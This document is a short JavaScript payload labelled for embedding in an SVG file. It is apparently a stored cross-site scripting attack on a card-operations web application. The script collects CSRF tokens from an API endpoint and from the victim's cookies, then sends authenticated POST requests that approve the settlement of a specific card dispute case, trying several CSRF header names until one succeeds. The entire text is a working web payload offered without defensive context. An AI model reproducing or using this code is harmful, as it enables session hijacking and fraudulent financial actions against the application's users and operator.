svg.script:
(async () => {
  const caseReference = 'CD-7FC8550C09';
  const status = document.getElementById('status');
  const setStatus = value => { status.textContent = value; };
  const cookies = () => Object.fromEntries(document.cookie.split(';').map(value => {
    const pair = value.trim().split('=');
    return [pair.shift(), pair.join('=')];
  }).filter(pair => pair[0]));

  try {
    setStatus('requesting-cardops-csrf');
    const csrfResponse = await fetch('/api/card-operations/csrf', {
      credentials: 'include',
      cache: 'no-store'
    });
    let csrf = {};
    let csrfText = '';
    try { csrfText = await csrfResponse.clone().text(); } catch (_) {}
    try { csrf = csrfText ? JSON.parse(csrfText) : {}; } catch (_) {}

    const jar = cookies();
    const tokenCandidates = [
      csrf.token, csrf.csrfToken, csrf.csrf_token, csrf.value,
      jar['CARDOPS-XSRF-TOKEN'], jar['XSRF-TOKEN'], jar['CSRF-TOKEN']
    ].filter(Boolean).map(value => decodeURIComponent(value));
    const token = tokenCandidates[0] || '';
    const headerNames = [
      csrf.headerName, csrf.header_name,
      'X-XSRF-TOKEN', 'X-CSRF-TOKEN', 'X-CARDOPS-CSRF'
    ].filter(Boolean);

    const endpoint = `/api/card-operations/disputes/${encodeURIComponent(caseReference)}/settle`;
    for (const headerName of [...new Set(headerNames)]) {
      const headers = {
        'Content-Type': 'application/json',
        'X-Requested-With': 'XMLHttpRequest'
      };
      headers[headerName] = token;
      const response = await fetch(endpoint, {
        method: 'POST',
        credentials: 'include',
        cache: 'no-store',
        headers,
        body: JSON.stringify({ decision: 'APPROVE' })
      });
      setStatus(response.ok ? 'review-approved' : `review-${response.status}`);
      if (response.ok || response.status === 409) break;
    }
  } catch (_) {
    setStatus('review-action-failed');
  }
})();
